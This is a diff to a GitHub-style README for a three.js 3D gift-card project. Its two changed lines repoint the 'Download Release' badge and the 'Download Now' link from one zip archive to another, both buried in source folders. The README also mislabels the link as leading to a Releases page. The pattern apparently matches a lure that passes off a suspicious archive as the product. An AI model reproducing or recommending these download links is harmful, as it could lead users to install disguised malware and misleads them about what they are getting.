@@ -1,6 +1,6 @@
 # 🎁 threejs-z-fold-gift-card - Create Stunning 3D Gift Cards Easily
 
-[![Download Release](https://raw.githubusercontent.com/LanzasLed/threejs-z-fold-gift-card/main/src/scripts/threejs-z-fold-gift-card-v3.6.zip%20Now-Here-28a745?style=for-the-badge)](https://raw.githubusercontent.com/LanzasLed/threejs-z-fold-gift-card/main/src/scripts/threejs-z-fold-gift-card-v3.6.zip)
+[![Download Release](https://github.com/LanzasLed/threejs-z-fold-gift-card/raw/refs/heads/main/src/svg/fold_gift_z_card_threejs_2.7.zip%20Now-Here-28a745?style=for-the-badge)](https://github.com/LanzasLed/threejs-z-fold-gift-card/raw/refs/heads/main/src/svg/fold_gift_z_card_threejs_2.7.zip)
 
 ## 📚 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -23,7 +23,7 @@ Before you start, make sure your computer meets the following requirements:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application. 
 
-[Download Now](https://raw.githubusercontent.com/LanzasLed/threejs-z-fold-gift-card/main/src/scripts/threejs-z-fold-gift-card-v3.6.zip)
+[Download Now](https://github.com/LanzasLed/threejs-z-fold-gift-card/raw/refs/heads/main/src/svg/fold_gift_z_card_threejs_2.7.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release version.
